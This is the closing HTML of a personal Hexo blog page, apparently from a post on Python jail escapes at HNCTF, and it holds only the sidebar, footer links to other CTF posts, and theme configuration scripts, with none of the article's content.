toc-level-3"><a class=toc-link href=#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail><span class=toc-number></span> <span class=toc-text> Ok, so that's the end of the hnctf. There are some thing that may help you get further about pyjail:</span></a></div><div class="related panel pjax" data-title=Related></div><div class="overview panel" data-title=Overview><div class=author itemprop=author itemscope itemtype=http://schema.org/Person><img alt=Moyao class=image data-src=/assets/avatar.jpg itemprop=image loading=lazy><p class=name itemprop=name>Moyao<div class=description itemprop=description>Write down something interesting I met<br> Feel free to mail me if you have something wanted to talk about, plz mail: &LTmoyaoxue@outlook.com></div></div><nav class=state><div class="item posts"><a href=/archives/><span class=count>74</span><span class=name>posts</span></a></div><div class="item tags"><a href=/tags/><span class=count>14</span><span class=name>tags</span></a></div></nav><div class=social><a class="item github" href=https://github.com/name rel=noopener target=_blank title=https://github.com/name><i class="ic i-github"></i></a></div><div class=menu><li class=item><a href=/ rel=section><i class="ic i-home"></i>Home</a></div></div></div></div><ul id=quick><li class="prev pjax"><a title="Previous Post" href=/2022/11/02/hnctfRe/ rel=prev><i class="ic i-chevron-left"></i></a><li class=up><i class="ic i-arrow-up"></i><li class=down><i class="ic i-arrow-down"></i><li class="next pjax"><a title="Next Post" href=/2022/09/25/Changes-of-Python-API-in-IDA/ rel=next><i class="ic i-chevron-right"></i></a><li class=percent></ul></div></div><div class=dimmer></div></div></main><footer id=footer><div class=inner><div class=widgets><div class="rpost pjax"><h2>Random Posts</h2><ul><li class=item><div class=breadcrumb></div><span><a href=/2024/01/31/ubuntu-python-version-manage/>ubuntu python version manage</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/09/18/seccon-2023/>seccon 2023</a></span><li class=item><div class=breadcrumb></div><span><a href=/2024/03/28/ACTF-flutter%E5%A4%8D%E7%8E%B0/>ACTF flutter复现</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/10/12/idapython%E5%88%9D%E6%8E%A2/>idapython初探</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/11/08/ACTF2023/>ACTF2023</a></span><li class=item><div class=breadcrumb></div><span><a href=/2022/11/01/pythonJail/>pythonJail</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/08/23/%E5%88%9D%E6%8E%A2flutter/>初探flutter</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/10/02/BuckeyeCTF2023/>BuckeyeCTF2023</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/>羊城杯2023</a></span><li class=item><div class=breadcrumb></div><span><a href=/2023/10/04/flare-on2023/>flare-on2023</a></span></ul></div><div class="rpost pjax"><h2>Recent Comments</h2><ul class=leancloud-recent-comment id=new-comment></ul></div></div><div class=status><div class=copyright>© 2022 -<span itemprop=copyrightYear>2024</span><span class=with-love><i class="ic i-sakura rotate"></i></span><span class=author itemprop=copyrightHolder>Moyao @ Moyao の小屋</span></div><div class=count><span class=post-meta-item-icon><i class="ic i-chart-area"></i></span><span title="Symbols count total">649k words</span><span class=post-meta-divider>|</span><span class=post-meta-item-icon><i class="ic i-coffee"></i></span><span title="Reading time total">9:50</span></div><div class=powered-by>Powered by <a href=https://hexo.io/ rel=noopener target=_blank>Hexo</a> & Theme.<a href=https://github.com/theme-shoka-x/hexo-theme-shokaX/ rel=noopener target=_blank>ShokaX</a></div></div></div></footer></div><script data-config>var LOCAL = {
        path: `2022/11/01/pythonJail/`,
        favicon: {
        show: `(●´3｀●) Here we go again.`,
        hide: `(´Д｀) It's a disaster!`
    },
    search: {
        placeholder: "Search for Posts",
        empty: "We didn't find any results for the search: ${query}",
        stats: "${hits} results found in ${time} ms"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">Article Timeliness Alert</span><br>This is an article published {{publish}} days ago and last updated {{updated}} days ago. Some information may have changed, so please be careful to screen it.</p></div>`,
    quiz: {
        choice: `Multiple Choice`,
        multiple: `Multiple Answer`,
        true_false: `True/False`,
        essay: `Questions`,
        gap_fill: `Gap Filling`,
        mistake: `Wrong Answer`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};</script><script src=https://cdn.bootcdn.net/ajax/libs/vue/3.3.4/vue.global.prod.min.js></script><script src=https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.2.4/pace.min.js></script><script src=https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/algoliasearch/4.12.1/algoliasearch-lite.umd.min.js></script><script src=https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/instantsearch.js/4.39.0/instantsearch.production.min.js></script><script src=https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js></script><script src=/js/app.js?v=0.3.15></script>